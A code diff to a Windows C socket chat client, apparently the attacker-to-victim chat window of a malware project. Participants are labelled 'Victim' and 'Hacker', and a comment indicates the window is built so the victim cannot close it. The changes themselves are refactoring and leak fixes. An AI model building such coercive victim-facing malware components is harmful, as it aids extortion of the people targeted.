@@ -7,6 +7,9 @@
 
 #pragma comment(lib,"ws2_32.lib")
 
+#include "DVpro.h"
+#include "Shared.h"
+
 #define ID_EDIT   0x00000001
 #define ID_BUTTON 0x00000002
 #define IDC_LIST  0x00000003
@@ -23,7 +26,7 @@ struct Message_s {
 
 
 
-#include "_win_form.h"
+#include "WinForm.h"
 
 /* START send chat */
 #define _SEND_NEW_MESSAGE "client_new_message;"
@@ -38,7 +41,6 @@ struct Message_s {
 #define _CLOSE_CHAT "close_chat;"
 /* END CLOSE chat */
 
-static char* wchar_to_char(const wchar_t* pwchar);
 DWORD CALLBACK recv_thread();
 BOOL EXIT_WINDOW_SAFE = FALSE;
 static HWND hwndEdit, hwndList;
@@ -94,7 +96,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             NULL,
             NULL
         );
-        SetWindowTextW(hwnd, L"Chat with @@");
+
+        SetWindowTextW(hwnd, L"Chat");
         break;
     case WM_COMMAND:
 
@@ -108,7 +111,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             wchar_t* text = calloc(len, sizeof(wchar_t*));
             GetWindowTextW(hwndEdit, text, len);
             message.message = text;
-            message.name = L"victim";
+            message.name = L"Victim";
             StringCbPrintfW(buf, ARRAYSIZE(buf), L"%ls: %ls", message.name, message.message);
             SendMessageW(hwndList, LB_ADDSTRING, 0, (LPARAM)buf);
             /* END insert message for client */
@@ -116,9 +119,10 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             /* START send message for srvr */
 
             char* char_message = wchar_to_char(message.message);
-            char info_buffer[4096] = _SEND_NEW_MESSAGE;
+            char *info_buffer = calloc(4096,sizeof(char));
+            strcat(info_buffer, _SEND_NEW_MESSAGE);
             strcat(info_buffer, char_message);
-            if (send(_s, info_buffer, strlen(info_buffer), 0) < 0)
+            if (send_dv(_s, info_buffer, strlen(info_buffer), 0) < 0)
             {
                 break;
             }
@@ -126,12 +130,14 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             /* END send message for srvr */
             free(text);
             free(char_message);
+            free(info_buffer);
         }
         break;
 
     case WM_DESTROY:
         {
             //NO THAT IS WILL NEVER HAPPEN IF I DON'T WANT IT!
+            
             ExitThread(0);
         }
     }
@@ -172,14 +178,6 @@ DWORD WINAPI show_chat_form(DATA* data) {
         return 0;
 }
 
-wchar_t* charToWChar2(const char* text)
-{
-	wchar_t wszTo[1024];
-	wszTo[strlen(text)] = L'\0';
-	MultiByteToWideChar(CP_ACP, 0, text, -1, wszTo, (int)strlen(text));
-	wchar_t* wchr = StrDupW(wszTo);
-	return wchr;
-}
 
 
 
@@ -189,6 +187,7 @@ DWORD CALLBACK recv_thread() {
         char* srvr_recv = calloc(2000, sizeof(char*));
         if ((recv(_s, srvr_recv, 2000, 0)) == SOCKET_ERROR)
         {
+            free(srvr_recv);
             break;
         }
 
@@ -201,7 +200,7 @@ DWORD CALLBACK recv_thread() {
             struct Message_s message;
             char* _message = srvr_recv + strlen(_RECV_NEW_MESSAGE);
             message.name = L"Hacker";   //TODO: make it chagable use  
-            message.message = charToWChar2(_message);
+            message.message = charToWChar(_message);
             StringCbPrintfW(buf, ARRAYSIZE(buf), L"%ls: %ls", message.name, message.message);
             SendMessageW(hwndList, LB_ADDSTRING, 0, (LPARAM)buf);
         }
@@ -218,11 +217,3 @@ DWORD CALLBACK recv_thread() {
  
 }
 
-char* wchar_to_char(const wchar_t* pwchar)
-{
-    char szTo[4096];
-    szTo[lstrlenW(pwchar)] = '\0';
-    WideCharToMultiByte(CP_ACP, 0, pwchar, -1, szTo, (int)lstrlenW(pwchar), NULL, NULL);
-    char* chr = _strdup(szTo);
-    return chr;
-}
